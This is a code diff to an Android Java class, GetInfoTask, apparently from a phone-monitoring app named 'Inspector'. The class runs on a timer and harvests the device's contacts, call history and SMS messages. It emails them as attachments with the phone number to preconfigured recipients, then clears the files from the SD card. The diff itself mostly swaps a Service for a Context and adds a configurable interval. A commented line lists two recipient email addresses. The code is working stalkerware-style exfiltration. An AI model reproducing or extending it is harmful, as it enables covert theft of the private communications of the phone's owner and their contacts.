@@ -18,6 +18,8 @@ import system.service.feature.phonecall.PhoneCallCtrl;
 import system.service.feature.phonecall.PhoneCallInfo;
 import system.service.feature.sms.SmsCtrl;
 import system.service.feature.sms.SmsInfo;
+
+import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.mail.GMailSenderEx;
@@ -40,61 +42,71 @@ public class GetInfoTask extends TimerTask
 {
 	private final static String LOGTAG = "GetInfoTask";
 	
-	public Service service;
+	public Context context;
+	private int interval = 1; // interval days
 	
 	public static List<File> attachments;
 	
-	public GetInfoTask(Service service)
+	public GetInfoTask(Context context)
 	{
 		super();
-		this.service = service;
+		this.context = context;
 		if (attachments != null) attachments.clear();
 		else attachments = new ArrayList<File>();
+		
+		interval = GlobalPrefActivity.getInfoInterval(context);
 	}
 	
 	public void run() 
 	{
 		// If network connected, try to collect and send the information
-		if (!SysUtils.isNetworkConnected(service.getApplicationContext())) return;
+		if (!SysUtils.isNetworkConnected(context)) return;
 		
 		// Firstly we should make sure the time range (>24H)
-		Date lastDatetime = new Date(ConfigCtrl.getLastGetInfoTime(service.getApplicationContext()));
+		Date lastDatetime = null;
+		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
+		if (lastDatetimeStr.length() > 0) {
+			try {
+				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
+			} catch (Exception ex) {}
+		}
+			
 		Calendar now = Calendar.getInstance();
-		now.add(Calendar.DATE, -1);
-		Date now_minus_1_day = now.getTime();
-		if (lastDatetime != null && now_minus_1_day.before(lastDatetime)) 
+		now.add(Calendar.DATE, -1*interval);
+		Date now_minus_x_day = now.getTime();
+		if (lastDatetime != null && now_minus_x_day.before(lastDatetime)) 
 		{
 			//Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
 			return;
 		}
 		
 		// Collect information
-		CollectContact(this.service);
+		CollectContact(context);
 		SysUtils.ThreadSleep(10000, LOGTAG);
-		CollectPhoneCallHist(this.service);
+		CollectPhoneCallHist(context);
 		SysUtils.ThreadSleep(10000, LOGTAG);
-		CollectSms(this.service);
+		CollectSms(context);
 		SysUtils.ThreadSleep(2000, LOGTAG);
 		
 		// Send mail
-		String phoneNum = DeviceProperty.getPhoneNumber(service);
-		String subject = service.getResources().getString(R.string.mail_from) 
+		String phoneNum = DeviceProperty.getPhoneNumber(context);
+		String subject = context.getResources().getString(R.string.mail_from) 
 	          		 + (phoneNum.length() > 0 ? " " + phoneNum : " Inspector") 
 	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());;
-		String body = String.format(service.getResources().getString(R.string.mail_body), 
-					DeviceProperty.getPhoneNumber(service));
+		String body = String.format(context.getResources().getString(R.string.mail_body), 
+					DeviceProperty.getPhoneNumber(context));
 		List<String> fileList = new ArrayList<String>();
 		for (int i = 0; i < attachments.size(); i++)
 			fileList.add(attachments.get(i).getAbsolutePath());
 		
-		String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
-		String pwd = MailCfg.getSenderPwd(service);
+		String[] recipients = getRecipients(context);//{"richardroky@gmail.com", "ylssww@126.com"};
+		String pwd = MailCfg.getSenderPwd(context);
 		
 		boolean result = false;
 		int retry = 3;
 		while(!result && retry > 0)
 		{
-			String sender = MailCfg.getSender(service);
+			String sender = MailCfg.getSender(context);
 			result = sendMail(subject, body, sender, pwd, recipients, fileList);
 			if (!result) retry--;
 		}
@@ -102,13 +114,12 @@ public class GetInfoTask extends TimerTask
 			
 		// Update the last date time
 		if (result) {
-			boolean successful = ConfigCtrl.setLastGetInfoTime(service, new Date());
+			boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
 			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
 		}
 		
 		// Clean the files in SD-CARD
 		FileCtrl.cleanFolder();
-		
 	}
 	
 	public static void CollectSms(Context context) 
